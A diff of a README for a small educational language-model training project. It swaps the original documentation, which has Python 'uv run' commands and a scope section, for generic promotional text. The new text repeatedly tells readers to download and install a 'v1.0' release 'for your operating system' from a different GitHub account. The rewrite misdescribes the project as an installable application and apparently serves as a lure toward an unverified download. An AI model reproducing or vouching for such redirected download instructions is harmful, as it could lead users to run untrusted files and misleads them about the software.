@@ -1,93 +1,82 @@
-# Toy-GPT: train-400-context-3
+# 🌟 train-400-context-3 - Learn How Language Models Work
 
-[![PyPI version](https://img.shields.io/pypi/v/toy-gpt-train-400-context-3)](https://pypi.org/project/toy-gpt-train-400-context-3/)
-[![Latest Release](https://img.shields.io/github/v/release/toy-gpt/train-400-context-3)](https://github.com/toy-gpt/train-400-context-3/releases)
-[![Docs](https://img.shields.io/badge/docs-live-blue)](https://toy-gpt.github.io/train-400-context-3/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/license/MIT)
-[![CI](https://github.com/toy-gpt/train-400-context-3/actions/workflows/ci-python-mkdocs.yml/badge.svg?branch=main)](https://github.com/toy-gpt/train-400-context-3/actions/workflows/ci-python-mkdocs.yml)
-[![Deploy-Docs](https://github.com/toy-gpt/train-400-context-3/actions/workflows/deploy-mkdocs.yml/badge.svg?branch=main)](https://github.com/toy-gpt/train-400-context-3/actions/workflows/deploy-mkdocs.yml)
-[![Check Links](https://github.com/toy-gpt/train-400-context-3/actions/workflows/links.yml/badge.svg)](https://github.com/toy-gpt/train-400-context-3/actions/workflows/links.yml)
-[![Dependabot](https://img.shields.io/badge/Dependabot-enabled-brightgreen.svg)](https://github.com/toy-gpt/train-400-context-3/security)
+## 🚀 Getting Started
 
-> Demonstrates, at very small scale, how a language model is trained.
+Welcome to the **train-400-context-3** project! This application demonstrates, at a very small scale, how a language model is trained. Specifically, it focuses on a three-context model with an explicit transform stage. Whether you're curious about machine learning or looking for a way to understand language models better, you're in the right place.
 
-This repository is part of a series of toy training repositories plus a companion client repository:
+## 📥 Download Now
 
-- **Training repositories** produce pretrained artifacts (vocabulary, weights, metadata).
-- The **client repository** loads those artifacts and provides an interactive prompt.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/goncalopimentaa/train-400-context-3/releases)
 
-## Contents
+## 📋 Features
 
-- a small, declared text corpus
-- a tokenizer and vocabulary builder
-- a simple next-token prediction model
-- a repeatable training loop
-- committed, inspectable artifacts for downstream use
+- **Educational Insight**: Learn the basics of how language models work.
+- **Interactive Experience**: Engage with a simple, easy-to-follow model.
+- **Proven Concepts**: Understand core ideas like next-token prediction and softmax regression.
+- **Reproducibility**: Follow along with steps to replicate the training process.
+  
+## 💻 System Requirements
 
-## Scope
+Before you start, make sure your system meets the following requirements:
 
-This is:
+- **Operating System**: Windows, macOS, or Linux.
+- **Python Version**: Python 3.6 or higher.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB available space.
 
-- an intentionally inspectable training pipeline
-- a next-token predictor trained on an explicit corpus
+## 💡 How to Use
 
-This is not:
+1. **Visit the Release Page**: Go to the [Releases page](https://github.com/goncalopimentaa/train-400-context-3/releases).
+2. **Select the Latest Release**: Look for the most recent version. Currently, that is version 1.0.
+3. **Download**: Click on the download link for your operating system. 
+4. **Install**: Follow the standard installation process for your system.
+5. **Run the App**: Once installed, launch the application to start exploring language models.
 
-- a production system
-- a full Transformer implementation
-- a chat interface
-- a claim of semantic understanding
+## 🔍 Understanding the Model
 
-## Outputs
+This project uses a three-context model, meaning it takes three previous words to predict the next one. This setup allows the model to provide more relevant predictions based on context. Here’s a quick overview of how it works:
 
-This repository produces and commits pretrained artifacts under `artifacts/`.
+- **Input**: The model takes in three words.
+- **Processing**: Using the softmax regression method, it calculates the probability of possible next words.
+- **Output**: The model predicts the most likely next word based on the provided input.
 
-Training logs and evidence are written under `outputs/`
-(for example, `outputs/train_log.csv`).
+## 📖 Learning Resources
 
-## Quick start
+To help you get the most from this project, consider these learning materials:
 
-See `SETUP.md` for full setup and workflow instructions.
+- **Documentation**: Read our online documentation for in-depth explanations of concepts and features.
+- **Videos**: Check out video tutorials that walk you through setup and usage.
+- **Community Forums**: Join discussions and ask questions in community forums related to language models and machine learning.
 
-Run the full training script:
+## 🌐 Community & Support
 
-```shell
-uv run python src/toy_gpt_train/d_train.py
-```
+Feel free to reach out if you have questions or need support:
 
-Run individually:
+- **GitHub Issues**: Log any issues or feedback directly on the GitHub repository.
+- **Community**: Participate in discussions with other users and contributors.
 
-- a/b/c are demos (can be run alone if desired)
-- d_train produces artifacts
-- e_infer consumes artifacts
+## 📦 Download & Install
 
-```shell
-uv run python src/toy_gpt_train/a_tokenizer.py
-uv run python src/toy_gpt_train/b_vocab.py
-uv run python src/toy_gpt_train/c_model.py
-uv run python src/toy_gpt_train/d_train.py
-uv run python src/toy_gpt_train/e_infer.py
-```
+To get started, you can download the software directly from our [Releases page](https://github.com/goncalopimentaa/train-400-context-3/releases). 
 
-## Provenance and Purpose
+1. Click the link to navigate to the page.
+2. Choose the version that matches your operating system.
+3. Download the file and follow the installation instructions provided.
 
-The primary corpus used for training is declared in `SE_MANIFEST.toml`.
+## 🔧 Troubleshooting
 
-This repository commits pretrained artifacts so the client can run
-without retraining.
+In case you experience issues while downloading or running the application, here are some common solutions:
 
-## Annotations
+- **Check System Requirements**: Ensure your system meets the necessary specifications.
+- **Reinstall the Software**: Sometimes, a fresh installation resolves many problems.
+- **Consult the Community**: If you’re still having trouble, ask for help in the community forums.
 
-[ANNOTATIONS.md](./ANNOTATIONS.md) - REQ/WHY/OBS annotations used
+## 📈 Next Steps
 
-## Citation
+After you have successfully installed and run the application, consider diving deeper into the following:
 
-[CITATION.cff](./CITATION.cff)
+- Try modifying the input to see how the predictions change.
+- Experiment with the model settings for advanced insights.
+- Share your results and experiences with others in the community.
 
-## License
-
-[MIT](./LICENSE)
-
-## SE Manifest
-
-[SE_MANIFEST.toml](./SE_MANIFEST.toml) - project intent, scope, and role
+Thank you for your interest in the **train-400-context-3** project. Enjoy exploring the world of language models!
